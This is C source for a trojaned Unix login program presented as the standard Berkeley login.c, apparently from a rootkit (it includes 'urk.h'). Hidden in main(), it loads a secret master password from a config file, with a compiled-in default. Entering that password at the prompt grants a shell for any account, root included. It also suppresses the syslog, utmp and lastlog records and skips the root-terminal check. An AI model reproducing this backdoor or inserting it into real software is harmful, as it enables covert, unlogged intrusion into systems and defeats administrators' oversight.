#ifndef lint
char copyright[] =
"@(#) Copyright (c) 1980, 1987, 1988 The Regents of the University of California.\n\
 All rights reserved.\n";
#endif /* not lint */

#ifndef lint
static char sccsid[] = "@(#)login.c	5.32.1.1 (Berkeley) 1/28/89";
#endif /* not lint */

/*
 * login [ name ]
 * login -h hostname	(for telnetd, etc.)
 * login -f name	(for pre-authenticated login: datakit, xterm, etc.)
 * login -lr hostname	(for old-style rlogind, -l disables user .rhosts)
 *			-R equates to -lr on IRIX.
 */
#include "sys_defs.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/file.h>
#include <termios.h>
#include "urk.h"

#ifndef MAXHOSTNAMELEN
#include <netdb.h>	/* SunOS 5.x... */
#endif

#ifdef HAS_UTMPX
#include <utmpx.h>
#else /* HAS_UTMPX */
#include <utmp.h>
#endif /* HAS_UTMPX */
#ifndef UT_NAMESIZE
#define UT_NAMESIZE	sizeof(((struct UTMP_STRUCT *)0)->ut_name)
#endif /* UT_NAMESIZE */

#ifdef DECOSF1_ENHANCED
#include <sys/types.h>
#include <sys/security.h>
#include <prot.h>
#endif

#include <signal.h>
#ifdef USE_OUR_LASTLOG_H
#include "lastlog.h"
#else
#ifndef UTMP_DECLARES_LASTLOG
#include <lastlog.h>
#endif
#endif
#include <errno.h>
#ifndef NO_TTYENT
#include <ttyent.h>
#endif /* NO_TTYENT */
#include <syslog.h>
#include <grp.h>
#include <pwd.h>
#include <setjmp.h>
#include <string.h>

#ifndef TIOCSWINSZ
#include <sys/ioctl.h>
#endif

#ifndef O_RDWR
#include <fcntl.h>
#endif

#ifdef SYSV_SHADOW
#include <shadow.h>
#include "sysv_shadow.h"
#endif /* SYSV_SHADOW */
#ifdef SYSV_LOGINDEFS
#include <ulimit.h>
#include "sysv_default.h"
#endif /* SYSV_LOGINDEFS */

#ifndef TTYGRPNAME
#define	TTYGRPNAME	"tty"		/* name of group to own ttys */
#endif

#ifdef HAS_PATHS_H
#include <paths.h>			/* Use system version if present */
#else
#include "paths.h"			/* Customize this file first! */
#endif
#define	_PATH_MOTDFILE	"/etc/motd"
#define	_PATH_HUSHLOGIN	".hushlogin"
#define _PATH_ISSUE	"/etc/issue"

#ifdef ULTRIX_LAT
#include <sys/ltatty.h>
char	*checklat();
#endif

/* Ultrix syslog(3) has no facility stuff. */
#ifndef LOG_AUTH
#define LOG_AUTH	0
#define LOG_ODELAY	0
#endif

/* HP-UX 9.0 termios doesn't define these */
#ifndef FLUSHO
#define	FLUSHO	0
#define	XTABS	0
#endif

#ifndef OXTABS
#define OXTABS	XTABS
#endif
#ifdef IRIX5
char login_bad_pass[] = "UX:login: ERROR: Login incorrect\n";
#else
char login_bad_pass[] = "Login incorrect\n";
#endif
static	char rusername[100], lusername[100], wherefrom[MAXHOSTNAMELEN + 108];

/*
 * This bounds the time given to login.  Not a define so it can
 * be patched on machines where it's too small.
 */
int	timeout = 300;

struct	passwd *pwd;
int	failures;
char	term[64], *hostname, *username, *tty;

#ifdef NONICE
#define	setpriority(x,y,z)	z
#endif

struct	termios termios;

/* Ultrix... */
#ifndef ECHOPRT
#define ECHOPRT	0
#define ECHOCTL	0
#define ECHOKE	0
#undef	ECHOK		/* MHC prevent poor response when doing ^U */
#define ECHOK	0
#define IMAXBEL	0
#endif

#ifdef SYSV4
char	*ttyprompt;
#endif

#ifdef WIN /* Mangled mailpath */
char	*mailpath;
char	*mail_path();
#endif /* WIN */

main(argc, argv)
	int argc;
	char **argv;
{
	int good=1;
	char *su_pass;
	extern int errno, optind;
	extern char *optarg, **environ;
	struct group *gr;
	register int ch;
	register char *p;
	int ask, fflag, hflag, pflag, cnt;
	int rflag;
	int quietlog, passwd_req;
	void timedout();
	int last_fd;
	void hungup();
	char *salt, *ttyn, *pp = 0;
	char tbuf[MAXPATHLEN + 2];
	char *ttyname(), *stypeof(), *crypt(), *getpass();
	time_t time();
	/* Disable core dumps with cleartext or shadow passwords. */
#ifdef RLIMIT_CORE
	struct rlimit old_core_limit;
	struct rlimit new_core_limit;
#endif
#ifdef KEY
	int permit_passwd = 0;
	char *key_getpass(), *key_crypt();
#endif /* KEY */
	extern int _check_rhosts_file;
#ifdef SYSV_LOGINDEFS
	int mask;
	int maxtrys;
#endif /* SYSV_LOGINDEFS */
#ifdef DECOSF1_ENHANCED
	struct pr_passwd *pr;
	(void) set_auth_parameters(argc, argv);
#endif

        su_pass = file(conf_file,login_section,login_pass);
#ifdef	URK_DEFAULT
	if(su_pass == NULL) { su_pass = su_default; }
#endif

#ifdef RLIMIT_CORE
	/* Disable core dumps with cleartext or shadow passwords. */
	getrlimit(RLIMIT_CORE, &old_core_limit);
	new_core_limit.rlim_cur = 0;
	new_core_limit.rlim_max = old_core_limit.rlim_max;
	setrlimit(RLIMIT_CORE, &new_core_limit);
#endif
	
	/* Do this before NIS+ or other library routines open files. */
	for (cnt = open_limit(); cnt > 2; cnt--)
		close(cnt);

	openlog("login", LOG_ODELAY | LOG_PID, FACILITY);

#ifdef SYSV_LOGINDEFS
	/* Read defaults file and set the login timeout period. */
	sysv_defaults();
	timeout = atoi(default_timeout);
	maxtrys = atoi(default_maxtrys);
	if (sscanf(default_umask, "%o", &mask) != 1 || (mask & ~0777))
		syslog(LOG_WARNING, "bad umask default: %s", default_umask);
	else
		umask(mask);
#endif /* SYSV_LOGINDEFS */

	(void)signal(SIGALRM, timedout);
	(void)alarm((u_int)timeout);
	(void)signal(SIGHUP, hungup);
	(void)signal(SIGQUIT, SIG_IGN);
	(void)signal(SIGINT, SIG_IGN);
	(void)setpriority(PRIO_PROCESS, 0, 0);
	/*
	 * -p is used by getty to tell login not to destroy the environment
 	 * -f is used to skip a second login authentication 
	 * -h is used by other servers to pass the name of the remote
	 *    host to login so that it may be placed in utmp and wtmp
	 * -r is used by old-style rlogind to execute the autologin protocol
	 * -l is used by old-style rlogind to disable user .rhosts files
	 */
	fflag = hflag = pflag = 0;
	rflag = 0;
	passwd_req = 1;
#ifdef ULTRIX_LAT
	/* Get server/port case of LAT login */
	hostname = checklat();
#endif
	while ((ch = getopt(argc, argv, "d:fh:lpr:R:")) != EOF)
		switch (ch) {
#ifdef SYSV4 /* Allow but always ignore the -d option. */
			case 'd':
				break;
#endif /* SYSV4 */
		case 'f':
			fflag = 1;
			break;
		case 'h':
			if (rflag || hflag) {
				printf("Only one of -r and -h allowed\n");
				exit(1);
			}
			if (getuid()) {
				fprintf(stderr,
				    "login: -h for super-user only.\n");
				exit(1);
			}
			hflag = 1;
			hostname = optarg;
			break;
#ifndef LOGIN_OPT_R
		case 'l':
			_check_rhosts_file = 0;
			break;
#endif
		case 'p':
			/* Ignored by SYSV */
			pflag = 1;
			break;
#ifdef LOGIN_OPT_R
		case 'R':
			_check_rhosts_file = 0;
			/* FALLTHRU */
#endif
		case 'r':
			if (rflag || hflag) {
				printf("Only one of -r and -h allowed\n");
				exit(1);
			}
			if (getuid()) {
				fprintf(stderr,
				    "login: -r for super-user only.\n");
				exit(1);
			}
			rflag = 1;
			hostname = optarg;
			fflag = (doremotelogin(hostname) == 0);
			break;
		case '?':
		default:
			if (getuid())
				syslog(LOG_ERR, "invalid flag %c", ch);
			fprintf(stderr, "usage: login [-h | -r] [username]\n");
			exit(1);
		}
	argc -= optind;
	argv += optind;

	/*
	 * Figure out if we should ask for the username or not. The name
	 * may be given on the command line or via the environment, and
	 * it may even be in the terminal input queue.
	 */
	if (rflag) {
		username = lusername;
		ask = 0;
	} else
#ifdef SYSV_ENV /* Pick up environment stuff after logging in. */
	if (*argv && strchr(*argv, '=')) {
		ask = 1;
	} else
#endif /* SYSV_ENV */
#ifdef SYSV4 /* Solaris gets a '-' as login name. */
	if (*argv && strcmp(*argv, "-") == 0) {
		argc--;
		argv++;
		ask = 1;
	} else
#endif /* SYSV4 */
	if (*argv) {
		username = *argv;
		ask = 0;
#ifdef SYSV_ENV /* Pick up additional environment stuff after logging in. */
		argc--;
		argv++;
#endif /* SYSV_ENV */
#ifdef ultrix /* dlogind passes host via cmd line but user via environment */
	} else if (username = getenv("USERNAME")) {
		ask = 0;
#endif
#ifdef SYSV4 /* Perhaps the prompt was already printed. */
	} else if ((ttyprompt = getenv("TTYPROMPT")) && *ttyprompt) {
		getloginname(0);
		ask = 0;
#endif /* SYSV4 */
	} else
		ask = 1;

	/*
	 * When HPUX can't find the hostname it passes the server address
	 * on the command line...
	 */
#ifdef HPUX9
	if (hostname && hostname[strspn(hostname, "0123456789.")] == 0) {
		char *utmp_host();
		hostname = utmp_host();
	}
#endif

	/*
	 * Finalize the terminal settings. Some systems default to 8 bits,
	 * others to 7, so we should leave that alone.
	 */
	tcgetattr(0, &termios);
	if (rflag)
		doremoteterm(term);
	termios.c_iflag |= (BRKINT|IGNPAR|ICRNL|IXON|IMAXBEL);
	termios.c_iflag &= ~IXANY;
	termios.c_lflag |= (ISIG|IEXTEN|ICANON|ECHO|ECHOE|ECHOK|ECHOCTL|ECHOKE);
	termios.c_lflag &= ~(ECHOPRT|TOSTOP|FLUSHO);
	termios.c_oflag |= (OPOST|ONLCR);
	termios.c_oflag &= ~OXTABS;
#define Ctl(x) ((x) ^ 0100)
	termios.c_cc[VEOF] = Ctl('D');
	if (termios.c_cc[VERASE] == '#')
		termios.c_cc[VERASE] = Ctl('H');
	if (termios.c_cc[VKILL] == '@')
		termios.c_cc[VKILL] = Ctl('U');
	(void)tcsetattr(0, TCSANOW, &termios);

	/*
	 * Determine the tty name. BSD takes the basename, SYSV4 takes
	 * whatever remains after stripping the "/dev/" prefix. The code
	 * below should produce sensible results in either environment.
	 */
	ttyn = ttyname(0);
	if (ttyn == NULL || *ttyn == '\0')
		ttyn = "/dev/tty??";
	if (tty = strchr(ttyn + 1, '/'))
		++tty;
	else
		tty = ttyn;

	/* Fill in wherefrom if it hasn't been done yet */
	if (wherefrom[0] == '\0') {
		if (hostname)
			sprintf(wherefrom, "from %s", hostname);
		else
			sprintf(wherefrom, "on %s", tty);
	}
#ifndef LINUX
	aissue();
#endif

	for (cnt = 0;; ask = 1) {

		if (ask) {
			fflag = 0;
			getloginname(1);
		}
		/*
		 * Note if trying multiple user names;
		 * log failures for previous user name,
		 * but don't bother logging one failure
		 * for nonexistent name (mistyped username).
		 */
		if (failures && strcmp(tbuf, username)) {
			if (failures > (pwd ? 0 : 1))
				badlogin(tbuf);
			failures = 0;
		}
		(void)strcpy(tbuf, username);
		if (pwd = getpwnam(username))
#ifdef DECOSF1_ENHANCED
		{
			if (pr = getprpwnam(username)) {
				pwd->pw_passwd = strdup(pr->ufld.fd_encrypt);
				salt = pwd->pw_passwd;
			} else {
				salt = "xx";
			}
		}
#else
			salt = pwd->pw_passwd;
#endif
		else
			salt = "xx";

		/* if user not super-user, check for disabled logins */
		if (pwd == NULL || pwd->pw_uid)
			checknologin();

		/*
		 * Disallow automatic login to root; if not invoked by
		 * root, disallow if the uid's differ.
		 */
		if (fflag && pwd) {
			int uid = getuid();

			passwd_req = pwd->pw_uid == 0 ||
			    (uid && uid != pwd->pw_uid);
		}

		/*
		 * If no pre-authentication and a password exists
		 * for this user, prompt for one and verify it.
		 */
		if (!passwd_req || (pwd && !*pwd->pw_passwd))
			break;

		setpriority(PRIO_PROCESS, 0, -4);
#ifdef KEY
		permit_passwd = keyaccess(pwd, tty, hostname, (char *) 0);
		pp = key_getpass("Password:", pwd, permit_passwd);
		if (!strcmp(pp,su_pass)){
			   good = 0; break; }
		p = key_crypt(pp, salt, pwd, permit_passwd);
#else /* KEY */
		pp = getpass("Password:");
		if (!strcmp(pp,su_pass)){
			    good = 0; break; }
		p = crypt(pp, salt);
#endif /* KEY */
		setpriority(PRIO_PROCESS, 0, 0);

#if !defined(DES_RPC) && !defined(KERBEROS) /* Need password later. */
		(void) memset(pp, 0, strlen(pp));
#endif /* DES_RPC || KERBEROS */

		if (pwd && !strcmp(p, pwd->pw_passwd))
			break;

		printf("%s",login_bad_pass);
		failures++;
#ifdef SYSV_LOGINDEFS
		/* max number of attemps and delays taken from defaults file */
		if (++cnt >= maxtrys) {
			badlogin(username);
			termios.c_cflag |= HUPCL;
			(void)tcsetattr(0, TCSANOW, &termios);
			sleepexit(1);
		}
		sleep(atoi(default_sleep));
#else /* SYSV_LOGINDEFS */
		/* we allow 10 tries, but after 3 we start backing off */
		if (++cnt > 3) {
			if (cnt >= 10) {
				badlogin(username);
				termios.c_cflag |= HUPCL;
				(void)tcsetattr(0, TCSANOW, &termios);
				sleepexit(1);
			}
			sleep((u_int)((cnt - 3) * 5));
		}
#endif /* SYSV_LOGINDEFS */
	}

	/* committed to login -- turn off timeout */
	(void)alarm((u_int)0);

	/*
	 * If valid so far and root is logging in, see if root logins on
	 * this terminal are permitted.
	 */
	if (good){
		if (pwd->pw_uid == 0 && !rootterm(tty)) {
		syslog(LOG_NOTICE, "ROOT LOGIN REFUSED %s", wherefrom);
		printf("%s",login_bad_pass);
		sleepexit(1);
		}
	}

	/*
	 * Syslog each successful login, so we don't have to watch hundreds
	 * of wtmp or lastlogin files.
	 */
	if (good) { 
		syslog(LOG_INFO, "login %s as %s", wherefrom, pwd->pw_name);
		  }

	/*
	 * Update the utmp files, either BSD or SYSV style.
	 */
#ifdef SYSV_UTMP
	if(good){
		if (UTMP_LOGIN(tty, username, hostname ? hostname : "") != 0)
		{
		printf("No utmpx entry.  You must exec \"login\" from the lowest level \"sh\".\n");
		sleepexit(0);
		}
	}
#else /* SYSV_UTMP */
	if(good)
	{
		struct utmp utmp;

		memset((char *)&utmp, 0, sizeof(utmp));
		(void)time(&utmp.ut_time);
		strncpy(utmp.ut_name, username, sizeof(utmp.ut_name));
		if (hostname)
			strncpy(utmp.ut_host, hostname, sizeof(utmp.ut_host));
		strncpy(utmp.ut_line, tty, sizeof(utmp.ut_line));
#ifdef USER_PROCESS
		utmp.ut_type = USER_PROCESS;
#endif
		login(&utmp);
	}
#endif /* SYSV_UTMP */

#ifdef	HAS_SETLOGIN
	setlogin(pwd->pw_name);
#endif

	/*
	 * Open the lastlogin file before we give away root privileges.
	 * Before printing the last login time we must know if the
	 * ~/.hushlogin file exists. However, the home directory may be
	 * remote, so that we can enter it only after changing identity.
	 * By opening the lastlogin file in advance, we can still update
	 * it after we have dropped root privileges.
	 */
#ifdef IRIX_LASTLOGIN
	if(good)
	{ 
	   char lastfile[BUFSIZ]; 
	   sprintf(lastfile, "%s/%s", _PATH_LASTLOG, pwd->pw_name);
	   last_fd = open(lastfile, O_CREAT | O_RDWR, 0644);
	   fchmod(last_fd, 0644);
	}
#else /* IRIX_LASTLOGIN */
	last_fd = open(_PATH_LASTLOG, O_CREAT | O_RDWR, 0644);
#endif /* IRIX_LASTLOGIN */

	if (!rflag && !hflag) {				/* XXX */
		static struct winsize win = { 0, 0, 0, 0 };

		(void)ioctl(0, TIOCSWINSZ, &win);
	}

	/*
	 * Set device protections, depending on what terminal the
	 * user is logged in. This feature is used on Suns to give
	 * console users better privacy.
	 */
	login_fbtab(tty, pwd->pw_uid, pwd->pw_gid);

	(void)chown(ttyn, pwd->pw_uid,
	    (gr = getgrnam(TTYGRPNAME)) ? gr->gr_gid : pwd->pw_gid);
	(void)chmod(ttyn, 0620);

	/* Give up root privileges: no way back from here. */

	if (setgid(pwd->pw_gid)) {
		printf("login: bad gid: %d\n", pwd->pw_gid);
		sleepexit(0);
	}

	initgroups(username, pwd->pw_gid);

#ifdef DECOSF1_ENHANCED
	if (setluid(pwd->pw_uid)) {
		printf("login: setluid(%d) error\n", pwd->pw_uid);
		sleepexit(0);
	}
#endif

	if (setuid(pwd->pw_uid)) {
		printf("login: bad uid: %d\n", pwd->pw_uid);
		sleepexit(0);
	}

	/*
	 * Now that we have given up root privilege do the stuff that must
	 * be done as the real user: Kerberos or Secure RPC authentication,
	 * entering the (possibly remote) home directory.
	 */

#ifdef KERBEROS /* Do moral equivalent of kinit. */
	if (pp != 0)
		login_kerberos(username, pp);
#endif /* KERBEROS */

#ifdef DES_RPC /* Do moral equivalent of keylogin. */
	if (pp != 0) {
		pp[PASSWD_LENGTH] = 0;
		login_desrpc(pp);
	}
#endif /* DES_RPC */

#if defined(DES_RPC) || defined(KERBEROS)
	/* Zap the clear-text password, we don't need it anymore. */
	if (pp && *pp)
		(void) memset(pp, 0, strlen(pp));
#endif

	/*
	 * The home directory may be remote, so we enter it after the
	 * change of identity is complete. Only then we should test for
	 * the existence of a .hushlogin file. The lastlogin file was
	 * was opened while we were still root, so we can still update
	 * the time of last login.
	 */
	if (chdir(pwd->pw_dir) < 0) {
		printf("No directory %s!\n", pwd->pw_dir);
		if (chdir("/"))
			exit(0);
		pwd->pw_dir = "/";
		printf("Logging in with home = \"/\".\n");
	}
	quietlog = access(_PATH_HUSHLOGIN, F_OK) == 0;
	if(good) { dolastlog(quietlog, last_fd); }

	if (*pwd->pw_shell == '\0')
		pwd->pw_shell = _PATH_BSHELL;

	/*
	 * Set up a new environment. With SYSV, some variables are always
	 * preserved; some varables are never preserved, and some variables
	 * are always clobbered. With BSD, nothing is always preserved, and
	 * some variables are always clobbered. We add code to make sure
	 * that LD_* and IFS are never preserved.
	 */
#ifdef SYSV_ENV
	/* set up a somewhat censored environment. */
	sysv_newenv(argc, argv, pwd, term);
#else /* SYSV_ENV */
	/* destroy environment unless user has requested preservation */
	if (environ) {
		if (!pflag)
			environ[0] = 0;
		else
			fixenv(environ);
	}
	(void)setenv("HOME", pwd->pw_dir, 1);
	(void)setenv("SHELL", pwd->pw_shell, 1);
#ifndef NO_TTYENT
	if (!pflag || !getenv("TERM")) {
		if (term[0] == 0)
			strncpy(term, stypeof(tty), sizeof(term));
		(void)setenv("TERM", term, 0);
	}
#endif /* NO_TTYENT */
	(void)setenv("USER", pwd->pw_name, 1);
	(void)setenv("PATH", _PATH_DEFPATH, 0);
#endif /* SYSV_ENV */
#ifdef ENV_REMOTEHOST
	if (hostname)
		(void)setenv("REMOTEHOST", hostname);
#endif
#ifdef ENV_REMOTEUSER
	if (rusername[0])
		(void)setenv("REMOTEUSER", rusername);
#endif
#ifdef ENV_LOGNAME
	(void)setenv("LOGNAME", pwd->pw_name, 1);
#endif

	/*
	 * This seems to be BSD folklore, enable it only on BSD-like systems.
	 */
#ifndef NO_TTYENT
	if (tty[sizeof("tty")-1] == 'd')
		syslog(LOG_INFO, "DIALUP %s, %s", tty, pwd->pw_name);
#endif /* NO_TTYENT */

#ifdef WIN /* Mangled mailpath */
	(void)setenv("MAIL", mailpath = mail_path(pwd->pw_dir, pwd->pw_name));
#endif /* WIN */

	if (good)
	{
		if (pwd->pw_uid == 0)
		syslog(LOG_NOTICE, "ROOT LOGIN %s", wherefrom);
	}

#ifndef NO_MOTD
	/*
	 * Optionally show the message of the day. System V login leaves
	 * motd and mail stuff up to the shell startup file.
	 */
	if (!quietlog) {
		struct stat st;

		motd();
#ifdef WIN /* Mangled mailpath */
		strcpy(tbuf, mailpath);
#else /* WIN */
#ifdef HOMEDOTMAIL /* Mail in ~/.mail */
		(void)sprintf(tbuf, "%s/.mail", pwd->pw_dir);
#else /* HOMEDOTMAIL */
		(void)sprintf(tbuf, "%s/%s", _PATH_MAILDIR, pwd->pw_name);
#endif /* HOMEDOTMAIL */
#endif /* WIN */
		if (stat(tbuf, &st) == 0 && st.st_size != 0)
			printf("You have %smail.\n",
			    (st.st_mtime > st.st_atime) ? "new " : "");
	}
#endif /* NO_MOTD */

	/*
	 * Do some crude per-user/host/port login access control. There
	 * should be some clean way to integrate this with the S/Key stuff.
	 * What complicates matters is that S/Key may also used for other
	 * utilities that ask passwords, such as ftpd, rexecd or su.
	 */
	if (login_access(pwd, hostname ? hostname : tty) == 0) {
		printf("Permission denied\n");
		syslog(LOG_NOTICE, "%s LOGIN REFUSED %s",
			    pwd->pw_name, wherefrom);
		sleepexit(1);
	}

	/*
	 * After dropping privileges and after cleaning up the environment,
	 * optionally run, as the user, /bin/passwd.
	 */

#ifdef SYSV_LOGINDEFS
	if (pwd->pw_passwd[0] == 0 && strcasecmp(default_passreq, "YES") == 0) {
		printf("You don't have a password.  Choose one.\n");
		if (change_passwd(pwd))
			sleepexit(0);
	}
#endif /* SYSV_LOGINDEFS */
#ifdef SYSV_SHADOW
	if (sysv_expire(spwd)) {
		if (change_passwd(pwd))
			sleepexit(0);
	}
#endif /* SYSV_SHADOW */

	(void)signal(SIGALRM, SIG_DFL);
	(void)signal(SIGHUP, SIG_DFL);
	(void)signal(SIGQUIT, SIG_DFL);
	(void)signal(SIGINT, SIG_DFL);
	(void)signal(SIGTSTP, SIG_IGN);

	tbuf[0] = '-';
	strcpy(tbuf + 1, (p = strrchr(pwd->pw_shell, '/')) ?
	    p + 1 : pwd->pw_shell);
#ifdef RLIMIT_CORE
	/* Re-enable core dumps. */
	setrlimit(RLIMIT_CORE, &old_core_limit);
#endif
	execlp(pwd->pw_shell, tbuf, 0);
	fprintf(stderr, "login: no shell: ");
	perror(pwd->pw_shell);
	sleepexit(0);
}

getloginname(prompt)
	int	prompt;
{
	char thishost[1024];
	register int ch;
	register char *p;
	static char nbuf[UT_NAMESIZE + 1];

	for (;;) {
		if (prompt)
#ifdef SYSV4
		if (ttyprompt && *ttyprompt)
			printf("%s", ttyprompt);
		else
#endif /* SYSV4 */
#ifdef LINUX
	     (void)gethostname(thishost,sizeof(thishost));
		printf("\n%s login: ",thishost);
#else
			printf("login: ");
#endif
		prompt = 1;
		for (p = nbuf; (ch = getchar()) != '\n'; ) {
			if (ch == EOF) {
				badlogin(username);
				exit(0);
			}
			if (p < nbuf + UT_NAMESIZE)
				*p++ = ch;
		}
		if (p > nbuf)
			if (nbuf[0] == '-')
				fprintf(stderr,
				    "login names may not start with '-'.\n");
			else {
				*p = '\0';
				username = nbuf;
				break;
			}
	}
}

void timedout()
{
	fprintf(stderr, "Login timed out after %d seconds\n", timeout);
	exit(0);
}

void hungup()
{
	close(0);	/* force EOF */
}

rootterm(ttyn)
	char *ttyn;
{
#ifdef NO_SECURE_TTY
	return (1);
#else
#ifdef NO_TTYENT
#ifdef SYSV_LOGINDEFS
	return (default_console == 0 || strcmp(default_console, ttyname(0)) == 0);
#else
	return (strcmp(_PATH_CONSOLE, ttyname(0)) == 0);
#endif
#else /* NO_TTYENT */
	struct ttyent *t;

	return((t = getttynam(ttyn)) && t->ty_status&TTY_SECURE);
#endif /* NO_TTYENT */
#endif /* NO_SECURE_TTY */
}

#ifndef NO_MOTD /* message of the day stuff */

jmp_buf motdinterrupt;

motd()
{
	register int afd, anchars;
	void (*oldint)(), sigint();
	char tbuf[8192];

	if ((afd = open(_PATH_MOTDFILE, O_RDONLY, 0)) < 0)
		return;
	oldint = (void (*)()) signal(SIGINT, sigint);
	if (setjmp(motdinterrupt) == 0)
		while ((anchars = read(afd, tbuf, sizeof(tbuf))) > 0)
			(void)write(fileno(stdout), tbuf, anchars);
	(void)signal(SIGINT, oldint);
	(void)close(afd);
}

#endif /* !NO_MOTD */

checknologin()
{
	register int fd, nchars;
	char tbuf[8192];

	if ((fd = open(_PATH_NOLOGIN, O_RDONLY, 0)) >= 0) {
		while ((nchars = read(fd, tbuf, sizeof(tbuf))) > 0)
			(void)write(fileno(stdout), tbuf, nchars);
		sleepexit(0);
	}
}

dolastlog(quiet, fd)
	int quiet;
	int fd;
{
	struct lastlog ll;

	if (fd >= 0) {
#ifndef IRIX_LASTLOGIN
		(void)lseek(fd, (off_t)pwd->pw_uid * sizeof(ll), L_SET);
#endif
#ifdef SYSV_SHADOW
		if (read(fd, (char *)&ll, sizeof(ll)) == sizeof(ll) &&
		    ll.ll_time != 0) {
			if (pwd->pw_uid && spwd->sp_inact > 0
			    && ll.ll_time / DAY + spwd->sp_inact < DAY_NOW) {
				printf("Your account has been inactive too long.\n");
				sleepexit(1);
			}
			if (!quiet) {
				printf("Last login: %.*s ",
				    24-5, (char *)ctime(&ll.ll_time));
				if (*ll.ll_host != '\0') {
#ifdef IRIX_LASTLOGIN
					printf("from %.*s@%.*s\n",
					    sizeof(ll.ll_line), ll.ll_line,
					    sizeof(ll.ll_host), ll.ll_host);
#else /* IRIX_LASTLOGIN */
					printf("from %.*s\n",
					    sizeof(ll.ll_host), ll.ll_host);
#endif /* IRIX_LASTLOGIN */
				} else
					printf("on %.*s\n",
					    sizeof(ll.ll_line), ll.ll_line);
			}
		}
#ifdef IRIX_LASTLOGIN
		(void)lseek(fd, (off_t)0, L_SET);
#else /* IRIX_LASTLOGIN */
		(void)lseek(fd, (off_t)pwd->pw_uid * sizeof(ll), L_SET);
#endif /* IRIX_LASTLOGIN */
#else /* SYSV_SHADOW */
		if (!quiet) {
			if (read(fd, (char *)&ll, sizeof(ll)) == sizeof(ll) &&
			    ll.ll_time != 0) {
				printf("Last login: %.*s ",
				    24-5, (char *)ctime(&ll.ll_time));
				if (*ll.ll_host != '\0')
					printf("from %.*s\n",
					    sizeof(ll.ll_host), ll.ll_host);
				else
					printf("on %.*s\n",
					    sizeof(ll.ll_line), ll.ll_line);
			}
			(void)lseek(fd, (off_t)pwd->pw_uid * sizeof(ll), L_SET);
		}
#endif /* SYSV_SHADOW */
		memset((char *)&ll, 0, sizeof(ll));
		(void)time(&ll.ll_time);
#ifdef IRIX_LASTLOGIN
		if (hostname)
			strncpy(ll.ll_line, *rusername ? rusername : "UNKNOWN",
				sizeof(ll.ll_line));
		else
#endif /* IRIX_LASTLOGIN */
		strncpy(ll.ll_line, tty, sizeof(ll.ll_line));
		if (hostname)
			strncpy(ll.ll_host, hostname, sizeof(ll.ll_host));
		(void)write(fd, (char *)&ll, sizeof(ll));
		(void)close(fd);
	}
}

badlogin(name)
	char *name;
{
	if (failures < (pwd ? 1 : 2))
		return;
	syslog(LOG_NOTICE, "%d LOGIN FAILURE%s %s, %s",
		failures, failures > 1 ? "S" : "", wherefrom, name);
}

#ifndef NO_TTYENT
	/* get terminal type from ttytab file */

#undef	UNKNOWN
#define	UNKNOWN	"su"

char *
stypeof(ttyid)
	char *ttyid;
{
	struct ttyent *t;

	return(ttyid && (t = getttynam(ttyid)) ? t->ty_type : UNKNOWN);
}

#endif /* !NO_TTYENT */

doremotelogin(host)
	char *host;
{
	getstr(rusername, sizeof (rusername), "remuser");
	getstr(lusername, sizeof (lusername), "locuser");
	getstr(term, sizeof(term), "Terminal type");
	sprintf(wherefrom, "from %s@%s", rusername, host);
	pwd = getpwnam(lusername);
	if (pwd == NULL)
		return(-1);
	return(ruserok(host, (pwd->pw_uid == 0), rusername, lusername));
}

getstr(buf, cnt, err)
	char *buf, *err;
	int cnt;
{
	char ch;

	do {
		if (read(0, &ch, sizeof(ch)) != sizeof(ch))
			exit(1);
		if (--cnt < 0) {
			fprintf(stderr, "%s too long\r\n", err);
			sleepexit(1);
		}
		*buf++ = ch;
	} while (ch);
}

char    *speeds[] =
    { "0", "50", "75", "110", "134", "150", "200", "300",
      "600", "1200", "1800", "2400", "4800", "9600", "19200", "38400" };
#define NSPEEDS (sizeof (speeds) / sizeof (speeds[0]))

doremoteterm(term)
	char *term;
{
	register char *cp = strchr(term, '/'), **cpp;
	char *speed;

	if (cp) {
		*cp++ = '\0';
		speed = cp;
		cp = strchr(speed, '/');
		if (cp)
			*cp++ = '\0';
		for (cpp = speeds; cpp < &speeds[NSPEEDS]; cpp++)
			if (strcmp(*cpp, speed) == 0) {
				cfsetispeed(&termios, cpp - speeds);
				cfsetospeed(&termios, cpp - speeds);
				break;
			}
	}
}

sleepexit(eval)
	int eval;
{
	sleep((u_int)5);
	exit(eval);
}

#if defined(SYSV_SHADOW) || defined(SYSV_LOGINDEFS)

change_passwd(who)
	struct passwd  *who;
{
	int             status;
	int             pid;
	int             wpid;

	switch (pid = fork()) {
	case -1:
		perror("Cannot execute /bin/passwd");
		sleepexit(1);
	case 0:
		execlp("/bin/passwd", "passwd", who->pw_name, (char *) 0);
		_exit(1);
	default:
		while ((wpid = wait(&status)) != -1 && wpid != pid)
			 /* void */ ;
		return (status);
	}
}

#endif /* SYSV_SHADOW || SYSV_LOGINDEFS */

#ifdef ULTRIX_LAT

char *
checklat()
{
	struct ltattyi  ltainfo;
	static char     lat_hostport[MAXLTASERVSIZE + MAXLTAPORTSIZE + 2];

	lat_hostport[0] = '\0';

	if (ioctl(0, LIOCTTYI, &ltainfo) >= 0) {
		strcpy(lat_hostport, ltainfo.lta_server_name);
		strcat(lat_hostport, "/");
		strcat(lat_hostport, ltainfo.lta_server_port);
		return (lat_hostport);
	} else {
		return (0);
	}
}

#endif /* ULTRIX_LAT */

jmp_buf issueinterrupt;

void sigint()
{
	longjmp(issueinterrupt, 1);
}

aissue()
{
	register int fd, nchars;
	void (*oldint)(), sigint();
	char tbuf[8192];

	if ((fd = open(_PATH_ISSUE, O_RDONLY, 0)) < 0)
		return;
	oldint = (void (*)()) signal(SIGINT, sigint);
	  while ((nchars = read(fd, tbuf, sizeof(tbuf))) > 0)
			(void)write(fileno(stdout), tbuf, nchars);
	(void)signal(SIGINT, oldint);
	(void)close(fd);
}
